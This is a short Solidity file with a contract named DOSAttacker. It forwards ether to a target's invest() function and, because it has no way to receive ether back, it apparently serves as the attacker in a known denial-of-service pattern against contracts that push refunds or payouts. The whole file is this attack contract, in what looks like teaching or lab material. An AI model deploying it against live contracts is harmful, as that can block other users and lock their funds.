//SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract DOSAttacker {

    address public impl;

    constructor(address _impl) {
        impl = _impl;
    }
    function invest() public payable {
         (bool success,) = impl.call{value: msg.value}(abi.encodeWithSignature("invest()"));
         require(success, "Invest failed");
    }

}